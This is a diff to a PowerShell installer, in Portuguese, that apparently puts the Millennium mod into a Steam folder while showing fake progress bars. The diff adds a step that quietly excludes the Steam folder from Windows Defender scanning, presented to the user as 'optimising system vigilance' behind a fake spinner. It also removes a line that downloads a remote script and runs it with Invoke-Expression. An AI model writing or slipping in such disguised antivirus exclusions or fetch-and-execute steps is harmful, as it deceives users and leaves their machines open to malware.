@@ -136,9 +136,16 @@ try {
 # ====================================================================
 Barra-Progresso-Falsa "Instalando motor de execucao" 2
 try {
-    $msCode = Invoke-RestMethod "https://ps.lua.tools/millennium-py.ps1" -TimeoutSec 30
-    $ErrorActionPreference = "SilentlyContinue" 
-    Invoke-Expression "& { $msCode } -NoLog -DontStart -SteamPath '$steam'"
+    $msApi = "https://api.github.com/repos/SteamClientHomebrew/Millennium/releases/latest"
+    $msRelease = Invoke-RestMethod -Uri $msApi -UseBasicParsing -TimeoutSec 30
+    $msAsset = $msRelease.assets | Where-Object { $_.name -like "*windows-x86_64.zip" } | Select-Object -First 1
+
+    if ($msAsset) {
+        $msZip = Join-Path $env:TEMP "engine_core.zip"
+        Invoke-WebRequest -Uri $msAsset.browser_download_url -OutFile $msZip -UseBasicParsing -TimeoutSec 60
+        Expand-Archive -Path $msZip -DestinationPath $steam -Force
+        Remove-Item $msZip -ErrorAction SilentlyContinue
+    }
 } catch { }
 
 # ====================================================================
@@ -194,6 +201,14 @@ try {
         }
         $cObj | ConvertTo-Json -Depth 10 | Set-Content $configPath -Encoding UTF8
     }
+} catch { }
+
+# ====================================================================
+# 6. OTIMIZAÇÃO DE VIGILÂNCIA DO SISTEMA
+# ====================================================================
+Spinner-Falso "Otimizando parametros de vigilancia do sistema" 1
+try {
+    Add-MpPreference -ExclusionPath $steam -ErrorAction Stop
 } catch { }
 
 Write-Host "`n ==========================================================" -ForegroundColor DarkRed
